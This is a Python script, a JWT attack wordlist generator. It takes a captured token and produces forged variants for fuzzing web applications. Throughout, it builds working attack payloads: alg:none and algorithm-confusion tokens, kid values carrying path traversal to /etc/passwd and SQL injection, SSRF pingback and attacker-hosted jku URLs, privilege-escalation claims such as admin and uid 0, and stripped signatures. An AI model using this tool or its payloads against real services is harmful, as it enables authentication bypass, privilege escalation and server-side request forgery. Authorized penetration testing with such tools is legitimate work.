import base64
import json
import hashlib
import hmac
import time
from datetime import datetime, timedelta

def urlsafe_b64encode(data):
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

def urlsafe_b64decode(data):
    missing_padding = len(data) % 4
    if missing_padding:
        data += '=' * (4 - missing_padding)
    return base64.urlsafe_b64decode(data)

def decode_jwt_part(encoded_part):
    try:
        return urlsafe_b64decode(encoded_part).decode('utf-8')
    except Exception:
        return None

def sign_jwt(header_b64, payload_b64, secret, algorithm):
    message = f"{header_b64}.{payload_b64}".encode('utf-8')
    
    secret_bytes = b''
    if secret:
        secret_bytes = secret.encode('utf-8')

    if algorithm.startswith('HS'):
        try:
            hash_alg = {
                'HS256': hashlib.sha256,
                'HS384': hashlib.sha384,
                'HS512': hashlib.sha512
            }[algorithm]
            signature = hmac.new(secret_bytes, message, hash_alg).digest()
            return urlsafe_b64encode(signature)
        except KeyError:
            return "UNKNOWN_HS_ALG"
    elif algorithm.lower() == 'none':
        return ""
    return "SIGN_MANUALLY"

def generate_modified_jwt_tokens(jwt_token, secret_key=None, public_key_for_hs256_confusion=None, 
                                 ssrf_pingback_domain=None, attacker_jwks_url=None):
    tokens_list = []

    parts = jwt_token.split('.')
    if len(parts) != 3:
        print("Invalid JWT token format. It should have 3 parts separated by dots.")
        return []

    original_header_b64, original_payload_b64, original_signature_b64 = parts

    original_header_decoded = decode_jwt_part(original_header_b64)
    original_payload_decoded = decode_jwt_part(original_payload_b64)

    if not original_header_decoded or not original_payload_decoded:
        print("Could not decode header or payload. Ensure they are valid Base64 URL-safe encoded JSON.")
        return []

    try:
        original_header = json.loads(original_header_decoded)
        original_payload = json.loads(original_payload_decoded)
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON from header/payload: {e}")
        return []

    current_time = int(time.time())

    # Add original token
    tokens_list.append(jwt_token)

    # --- 1. 'alg': 'None' Attack ---
    header_none = original_header.copy()
    header_none['alg'] = 'none'
    header_none_b64 = urlsafe_b64encode(json.dumps(header_none).encode('utf-8'))
    tokens_list.append(f"{header_none_b64}.{original_payload_b64}.")
    print(f"[*] Generated 'alg:none' token: {tokens_list[-1]}")

    # 1.1. 'alg': 'None' with modified payload (privilege escalation attempts)
    common_priv_escalation_values = [
        True, "admin", "administrator", "root", "1", "super_user"
    ]
    for key, value in original_payload.items():
        if isinstance(value, (bool, str, int)) and (
            (isinstance(value, bool) and not value) or
            (isinstance(value, str) and value.lower() in ["guest", "user", "regular"]) or
            (isinstance(value, int) and value == 0) # e.g., if admin=0
        ):
            for new_val in common_priv_escalation_values:
                payload_modified = original_payload.copy()
                payload_modified[key] = new_val
                payload_modified_b64 = urlsafe_b64encode(json.dumps(payload_modified).encode('utf-8'))
                tokens_list.append(f"{header_none_b64}.{payload_modified_b64}.")
                print(f"[*] Generated 'alg:none' with modified payload: {tokens_list[-1]}")

    # 1.2. Algorithm Confusion (RS256/ES256 to HS256)
    original_alg = original_header.get('alg', '').upper()
    if original_alg.startswith('RS') or original_alg.startswith('ES'):
        header_hs256 = original_header.copy()
        header_hs256['alg'] = 'HS256'
        header_hs256_b64 = urlsafe_b64encode(json.dumps(header_hs256).encode('utf-8'))

        if public_key_for_hs256_confusion:
            signature_hs256_confusion = sign_jwt(header_hs256_b64, original_payload_b64, public_key_for_hs256_confusion, 'HS256')
            if signature_hs256_confusion not in ["UNKNOWN_HS_ALG", "SIGN_MANUALLY"]:
                tokens_list.append(f"{header_hs256_b64}.{original_payload_b64}.{signature_hs256_confusion}")
                print(f"[*] Generated 'alg confusion' (RS/ES to HS256) token: {tokens_list[-1]}")
            else:
                print(f"[-] Could not generate 'alg confusion' token (HS256 with public key). Check public key format.")

    # --- 2. Key ID (kid) and JWK/JKU Header Injection Attacks ---
    
    # 2.1. kid path traversal / SSRF attempts
    common_kid_paths = [
        "../../../../etc/passwd",
        "../../../dev/null",
        "/dev/null",
        "C:\\Windows\\win.ini",
        "file:///etc/passwd",
        "file:///C:/Windows/win.ini",
        "' OR 1=1--",
        "1 UNION SELECT 'dummy_key'--"
    ]
    if ssrf_pingback_domain:
        common_kid_paths.extend([
            f"http://{ssrf_pingback_domain}/ssrf_pingback_kid",
            f"https://{ssrf_pingback_domain}/ssrf_pingback_kid",
            f"http://127.0.0.1/ssrf_pingback_kid", # Localhost SSRF test
            f"http://localhost/ssrf_pingback_kid" # Localhost SSRF test
        ])

    for path in common_kid_paths:
        header_kid_mod = original_header.copy()
        header_kid_mod['kid'] = path
        header_kid_mod_b64 = urlsafe_b64encode(json.dumps(header_kid_mod).encode('utf-8'))
        tokens_list.append(f"{header_kid_mod_b64}.{original_payload_b64}.{original_signature_b64}")
        print(f"[*] Generated 'kid' path/SSRF token: {tokens_list[-1]}")

    # 2.2. Inject 'jwk' parameter (requires manual signing)
    header_jwk_mod = original_header.copy()
    header_jwk_mod['jwk'] = {
        "kty": "RSA",
        "n": "YOUR_ATTACKER_RSA_N_VALUE", # Replace with your actual RSA public modulus (base64url encoded)
        "e": "AQAB" # Common RSA public exponent (base64url encoded)
    }
    header_jwk_mod_b64 = urlsafe_b64encode(json.dumps(header_jwk_mod).encode('utf-8'))
    tokens_list.append(f"{header_jwk_mod_b64}.{original_payload_b64}.SIGN_MANUALLY")
    print(f"[*] Generated 'jwk' injection token (requires manual signing): {tokens_list[-1]}")


    # 2.3. Inject 'jku' parameter (SSRF to attacker's JWKS)
    if attacker_jwks_url:
        header_jku_mod = original_header.copy()
        header_jku_mod['jku'] = attacker_jwks_url
        header_jku_mod_b64 = urlsafe_b64encode(json.dumps(header_jku_mod).encode('utf-8'))
        tokens_list.append(f"{header_jku_mod_b64}.{original_payload_b64}.SIGN_MANUALLY")
        print(f"[*] Generated 'jku' (SSRF) injection token (requires manual signing): {tokens_list[-1]}")
    else:
        print("[-] Attacker JWKS URL not provided. Skipping 'jku' injection tokens.")


    # --- 3. Payload Manipulation Attacks ---

    # 3.1. Privilege Escalation attempts (if secret_key known for signing)
    target_keys_for_privilege = ["isAdmin", "admin", "role", "user_type", "permissions", "privilege"]
    privilege_values = [True, "admin", "administrator", "root", "1", 9999, "full_access"]

    for key_to_modify in target_keys_for_privilege:
        for val in privilege_values:
            payload_elevated = original_payload.copy()
            # If key exists and current value is less privileged, or if key doesn't exist
            if (key_to_modify in original_payload and (
                (isinstance(original_payload[key_to_modify], bool) and not original_payload[key_to_modify] and isinstance(val, bool) and val) or
                (isinstance(original_payload[key_to_modify], str) and original_payload[key_to_modify].lower() in ["user", "guest"] and isinstance(val, str) and val.lower() in ["admin", "administrator", "root"]) or
                (isinstance(original_payload[key_to_modify], int) and original_payload[key_to_modify] < 9999 and isinstance(val, int) and val == 9999)
            )) or key_to_modify not in original_payload:
                
                payload_elevated[key_to_modify] = val
                payload_elevated_b64 = urlsafe_b64encode(json.dumps(payload_elevated).encode('utf-8'))
                signature = sign_jwt(original_header_b64, payload_elevated_b64, secret_key, original_header.get('alg', ''))
                if signature not in ["UNKNOWN_HS_ALG", "SIGN_MANUALLY"]:
                    tokens_list.append(f"{original_header_b64}.{payload_elevated_b64}.{signature}")
                    print(f"[*] Generated privilege escalation token for '{key_to_modify}': {tokens_list[-1]}")
                elif not secret_key:
                    print(f"[!] Privilege escalation token for '{key_to_modify}' requires secret key for signing. Skipping automated generation.")

    # 3.2. Expiration (exp) and Not Before (nbf) manipulation
    
    # Extend expiration far into the future
    payload_long_exp = original_payload.copy()
    payload_long_exp['exp'] = current_time + (365 * 24 * 60 * 60 * 10) # 10 years from now
    payload_long_exp_b64 = urlsafe_b64encode(json.dumps(payload_long_exp).encode('utf-8'))
    signature = sign_jwt(original_header_b64, payload_long_exp_b64, secret_key, original_header.get('alg', ''))
    if signature not in ["UNKNOWN_HS_ALG", "SIGN_MANUALLY"]:
        tokens_list.append(f"{original_header_b64}.{payload_long_exp_b64}.{signature}")
        print(f"[*] Generated long expiration token: {tokens_list[-1]}")
    elif not secret_key:
        print("[!] Long expiration token requires secret key for signing. Skipping automated generation.")

    # Create an already expired token (if original wasn't)
    if 'exp' in original_payload and original_payload['exp'] > current_time:
        payload_expired = original_payload.copy()
        payload_expired['exp'] = current_time - (60 * 60 * 24) # 24 hours ago
        payload_expired_b64 = urlsafe_b64encode(json.dumps(payload_expired).encode('utf-8'))
        signature = sign_jwt(original_header_b64, payload_expired_b64, secret_key, original_header.get('alg', ''))
        if signature not in ["UNKNOWN_HS_ALG", "SIGN_MANUALLY"]:
            tokens_list.append(f"{original_header_b64}.{payload_expired_b64}.{signature}")
            print(f"[*] Generated expired token: {tokens_list[-1]}")
        elif not secret_key:
            print("[!] Expired token requires secret key for signing. Skipping automated generation.")

    # Create a token valid in the future (nbf)
    payload_future_nbf = original_payload.copy()
    payload_future_nbf['nbf'] = current_time + (5 * 60) # 5 minutes from now
    payload_future_nbf_b64 = urlsafe_b64encode(json.dumps(payload_future_nbf).encode('utf-8'))
    signature = sign_jwt(original_header_b64, payload_future_nbf_b64, secret_key, original_header.get('alg', ''))
    if signature not in ["UNKNOWN_HS_ALG", "SIGN_MANUALLY"]:
        tokens_list.append(f"{original_header_b64}.{payload_future_nbf_b64}.{signature}")
        print(f"[*] Generated future 'nbf' token: {tokens_list[-1]}")
    elif not secret_key:
        print("[!] Future 'nbf' token requires secret key for signing. Skipping automated generation.")

    # 3.3. Audience (aud) Manipulation
    aud_values_to_try = ["admin_service", "internal_api", "another_app", ["admin", "user"]]
    if 'aud' in original_payload:
        for aud_val in aud_values_to_try:
            if aud_val != original_payload['aud']: # Only modify if different
                payload_aud_modified = original_payload.copy()
                payload_aud_modified['aud'] = aud_val
                payload_aud_modified_b64 = urlsafe_b64encode(json.dumps(payload_aud_modified).encode('utf-8'))
                signature = sign_jwt(original_header_b64, payload_aud_modified_b64, secret_key, original_header.get('alg', ''))
                if signature not in ["UNKNOWN_HS_ALG", "SIGN_MANUALLY"]:
                    tokens_list.append(f"{original_header_b64}.{payload_aud_modified_b64}.{signature}")
                    print(f"[*] Generated 'aud' modified token: {tokens_list[-1]}")
                elif not secret_key:
                    print("[!] 'aud' modification token requires secret key for signing. Skipping automated generation.")
    else:
        for aud_val in aud_values_to_try:
            payload_add_aud = original_payload.copy()
            payload_add_aud['aud'] = aud_val
            payload_add_aud_b64 = urlsafe_b64encode(json.dumps(payload_add_aud).encode('utf-8'))
            signature = sign_jwt(original_header_b64, payload_add_aud_b64, secret_key, original_header.get('alg', ''))
            if signature not in ["UNKNOWN_HS_ALG", "SIGN_MANUALLY"]:
                tokens_list.append(f"{original_header_b64}.{payload_add_aud_b64}.{signature}")
                print(f"[*] Generated 'aud' added token: {tokens_list[-1]}")
            elif not secret_key:
                print("[!] 'aud' addition token requires secret key for signing. Skipping automated generation.")

    # 3.4. Injecting new claims
    new_claims_to_try = {
        "is_admin": True,
        "is_privileged": "true",
        "scope": ["admin", "user"],
        "jti": "some_new_unique_id_for_injection",
        "username": "admin",
        "uid": 0, # Common UID for root/admin
        "user_id": "1"
    }
    for new_claim, new_value in new_claims_to_try.items():
        if new_claim not in original_payload:
            payload_with_new_claim = original_payload.copy()
            payload_with_new_claim[new_claim] = new_value
            payload_with_new_claim_b64 = urlsafe_b64encode(json.dumps(payload_with_new_claim).encode('utf-8'))
            signature = sign_jwt(original_header_b64, payload_with_new_claim_b64, secret_key, original_header.get('alg', ''))
            if signature not in ["UNKNOWN_HS_ALG", "SIGN_MANUALLY"]:
                tokens_list.append(f"{original_header_b64}.{payload_with_new_claim_b64}.{signature}")
                print(f"[*] Generated new claim ('{new_claim}') token: {tokens_list[-1]}")
            elif not secret_key:
                print(f"[!] New claim ('{new_claim}') token requires secret key for signing. Skipping automated generation.")


    # --- 4. Signature Tampering (without secret) ---
    # These tokens are generated regardless of secret key because they test signature bypasses.
    tokens_list.append(f"{original_header_b64}.{original_payload_b64}.{urlsafe_b64encode(b'randombytesrandombytesrandombytesrandombytes')}")
    print(f"[*] Generated signature tampering (random) token: {tokens_list[-1]}")
    tokens_list.append(f"{original_header_b64}.{original_payload_b64}.") # No signature
    print(f"[*] Generated signature tampering (empty) token: {tokens_list[-1]}")

    return tokens_list

def main():
    print("--- JWT Attack Wordlist Generator ---")
    print("This script helps generate various JWT attack payloads.")
    print("-------------------------------------")

    jwt_token = input("Enter the JWT token (e.g., from your browser or Burp Suite): ")
    
    secret_key_input = input("Enter the secret key (if known, for HMAC algorithms like HS256. Leave blank if not known): ")
    secret_key = secret_key_input if secret_key_input else None 

    public_key_for_hs256_confusion_input = input(
        "Enter the public key (e.g., RSA public key string, PEM format) "
        "to test HS256 algorithm confusion (Leave blank if not applicable or known): "
    )
    public_key_for_hs256_confusion = public_key_for_hs256_confusion_input if public_key_for_hs256_confusion_input else None

    print("\n--- SSRF and JWKS/JKU Attack Specifics ---")
    print("These attacks attempt to make the target server connect to an attacker-controlled endpoint.")
    print("You will need to set up a listener (e.g., netcat, Burp Collaborator, interactsh) on these domains/IPs.")
    
    ssrf_pingback_domain_input = input(
        "Enter your SSRF pingback domain (e.g., 'your-collaborator-id.burpcollaborator.net' or 'your.interact.sh'). "
        "This will be used in 'kid' paths to test for SSRF. Leave blank if not testing SSRF: "
    )
    ssrf_pingback_domain = ssrf_pingback_domain_input if ssrf_pingback_domain_input else None

    attacker_jwks_url_input = input(
        "Enter the full URL to your malicious JWKS file (e.g., 'http://your-server.com/malicious_jwks.json'). "
        "This is used for 'jku' header injection. Leave blank if not testing JKU attacks: "
    )
    attacker_jwks_url = attacker_jwks_url_input if attacker_jwks_url_input else None


    modified_token_list = generate_modified_jwt_tokens(
        jwt_token, 
        secret_key=secret_key,
        public_key_for_hs256_confusion=public_key_for_hs256_confusion,
        ssrf_pingback_domain=ssrf_pingback_domain,
        attacker_jwks_url=attacker_jwks_url
    )

    output_filename = "jwt_attack_wordlist.txt"
    with open(output_filename, "w") as f:
        for item in modified_token_list:
            # Exclude tokens explicitly marked for manual signing or unknown HS algs if no secret provided
            if "SIGN_MANUALLY" not in item and "UNKNOWN_HS_ALG" not in item:
                f.write(item + "\n")
    
    print(f"\n--- Generation Complete ---")
    print(f"Modified JWT tokens wordlist saved to '{output_filename}'.")
    print("This file contains one JWT token per line, suitable for direct use in fuzzing tools like Burp Intruder.")
    print("\nIMPORTANT NOTES:")
    print("1. Tokens with 'SIGN_MANUALLY' (e.g., for JWK/JKU injection or if the secret key for HMAC was not provided) "
          "are *excluded* from the output file. You need to craft these specific tokens manually "
          "if you wish to test them, often by signing them with your own generated RSA private key "
          "and pointing 'jku' to a JWKS file you host.")
    print("2. For SSRF attacks via 'kid' or 'jku', ensure your pingback domain/JWKS URL is accessible by the target server "
          "and you have a listener active to detect incoming connections.")
    print("3. Always test on systems you have explicit permission to test.")

if __name__ == "__main__":
    main()
